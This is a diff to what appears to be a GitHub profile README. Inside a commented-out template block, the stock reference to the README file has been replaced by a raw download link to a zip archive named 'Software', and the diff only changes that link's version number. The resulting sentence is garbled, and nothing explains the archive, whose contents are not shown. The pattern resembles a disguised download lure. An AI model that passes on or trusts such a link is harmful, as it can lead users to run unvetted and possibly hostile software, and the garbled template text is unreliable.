@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-Israelgladys/Israelgladys is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Israelgladys/Israelgladys/main/tropidine/Software-2.2.zip` (this file) appears on your GitHub profile.
+Israelgladys/Israelgladys is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Israelgladys/Israelgladys/main/tropidine/Software-v2.1.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
